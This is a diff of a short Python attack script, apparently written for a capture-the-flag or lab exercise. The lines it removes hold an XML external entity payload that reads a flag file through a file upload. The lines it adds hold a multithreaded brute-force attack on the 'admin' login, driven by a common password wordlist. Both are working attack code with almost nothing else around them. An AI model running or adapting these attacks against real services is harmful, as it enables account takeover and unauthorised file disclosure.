@@ -1,27 +1,27 @@
+from concurrent.futures import ThreadPoolExecutor as PoolExecutor
+from os.path import expanduser
 import requests
 
 
-if __name__ == '__main__':
-    payload = '''<?xml version="1.0" encoding="UTF-16"?>
-    <!DOCTYPE data [
-    <!ELEMENT data ANY >
-    <!ENTITY file SYSTEM "file:///xxe/flag">
-    ]>
-    <foo>&file;</foo>'''
-
+def is_password_valid(password):
     sess = requests.Session()
-    sess.verify = False
-    sess.proxies = {
-        'http': 'http://127.0.0.1:8080',
-        'https': 'http://127.0.0.1:8080'
+    data = {
+        'login': 'admin',
+        'password': password
     }
+    resp = sess.post('http://127.0.0.1/login', data=data, allow_redirects=False)
+    if resp.next.url == 'http://127.0.0.1/profile':
+        return True, password
+    return False, password
+    
 
-    url = "http://localtest.me:80/level2"
+if __name__ == '__main__':
+    with open(expanduser('~/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt'), 'r') as infile:
+        passwords = infile.read().split('\n')[:-1]
 
-    files = {
-        'file': ('file.xml', payload, 'text/xml')
-    }
-    # files = {
-    #     'file': ('file.xml', payload.encode('utf16'), 'text/xml')
-    # }
-    resp = sess.post(url, files=files)
+    # print(passwords)
+
+    with PoolExecutor(max_workers=10) as executor:
+        for result, password in executor.map(is_password_valid, passwords):
+            if result:
+                print('Found valid password:', password)
